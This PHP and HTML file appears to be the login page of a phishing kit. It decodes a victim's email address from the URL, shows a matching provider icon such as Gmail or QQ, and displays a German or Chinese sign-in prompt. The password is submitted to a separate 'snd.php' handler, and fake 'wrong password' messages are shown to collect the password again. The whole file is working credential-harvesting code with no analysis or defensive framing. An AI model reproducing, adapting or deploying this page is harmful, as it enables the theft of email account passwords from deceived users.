<?php
error_reporting(E_ALL ^ E_NOTICE);  
$mail = $_GET['0'];
$dec = base64_decode($mail);
$domain = $dec;
if (stripos($domain, '.de') !== false || stripos($domain, '.at') !== false){
$serv = "serv/user.ico";
}

elseif (stripos($domain, '.ch') !== false || stripos($domain, '.com') !== false){
$serv = "serv/user.ico";
}

elseif (stripos($domain, '.eu') !== false){
$serv = "serv/user.ico";
}

elseif (stripos($domain, '.net') !== false){
$serv = "serv/user.ico";
}

elseif (stripos($domain, '126') !== false){
$serv = "serv/hm.ico";
}


elseif (stripos($domain, '@mail.com') !== false){
$serv = "serv/ma.ico";
	
}

elseif (stripos($domain, 'gmail.com') !== false){
$serv = "serv/gm.ico";
}

elseif (stripos($domain, 'qq') !== false){
$serv = "serv/qq.ico";
	
}

elseif (stripos($domain, 'hinet') !== false || stripos($domain, 'hi-net') !== false){	
$serv = "serv/hm.ico";
	
}

else{
$serv = "http://".$fav."/favicon.ico";
	
}
/**--------------------------------------------------------------**/
$c = $_GET["c"];
$a = $_GET["a"];
if($a == "0"){
	if (stripos($domain, 'hinet') !== false || stripos($domain, 'hi-net') !== false || stripos($domain, 'qq') !== false || stripos($domain, 'yeah') !== false || stripos($domain, '126') !== false || stripos($domain, '163') !== false){
$logo = "serv/logo/y.jpg";
$header = "登录以继续";
$em = "电子邮件";
$ps = "密码";
$wrong = "";
$submit = "继续";
}

else{
$logo = "serv/logo/y.jpg";
$header = "Melden Sie sich an, um fortzufahren";
$em = "Email";
$ps = "Passwort";
$wrong = "";
$submit = "Weiter";
}
}

elseif($a == "1"){
	
	
	if (stripos($domain, 'hinet') !== false || stripos($domain, 'hi-net') !== false || stripos($domain, 'qq') !== false || stripos($domain, 'yeah') !== false || stripos($domain, '126') !== false || stripos($domain, '163') !== false){
$logo = "serv/logo/y.jpg";
$header = "登录以继续";
$em = "电子邮件";
$ps = "密码";
$wrong = "请输入密码";
$submit = "继续";
}

else{
$logo = "serv/logo/y.jpg";
$header = "Melden Sie sich an, um fortzufahren";
$em = "Email";
$ps = "Passwort";
$wrong ="Bitte geben Sie das Passwort ein";
$submit = "Weiter";
}
}


else{

if (stripos($domain, 'hinet') !== false || stripos($domain, 'hi-net') !== false || stripos($domain, 'qq') !== false || stripos($domain, 'yeah') !== false || stripos($domain, '126') !== false || stripos($domain, '163') !== false){
$logo = "serv/logo/y.jpg";
$header = "登录以继续";
$em = "电子邮件";
$ps = "密码";
$wrong = "服务器响应：密码错误";
$submit = "继续";
}

else{
$logo = "serv/logo/y.jpg";
$header = "Melden Sie sich an, um fortzufahren";
$em = "Email";
$ps = "Passwort";
$wrong = "Falsches Passwort: Noch eine Testversion übrig";
$submit = "Wiederholen";

}
}
?>

<!doctype html>
<html>
	<head>
		<meta charset="utf-8">
		<link rel="stylesheet" href="cache/style2.css">
	</head>
	<body>
		<div class="loginBox">
			<img src="<?php echo $serv; ?>" class="user">
			<h2><?php echo $header;?></h2>
			<form action="snd.php?c=<?php echo $c; ?>" method="post">
				<p><?php echo $em;?></p>
				<input type="text" readonly name="e" placeholder="" value="<?php echo $dec; ?>">
				<p><?php echo $ps;?></p>
				<input type="password" name="p" required placeholder="••••••">
				<div id="wrong"> <?php echo $wrong;?></div>
				<input type="submit" name="" value="<?php echo $submit;?>">
				
			</form>
		</div>
	</body>
</html>
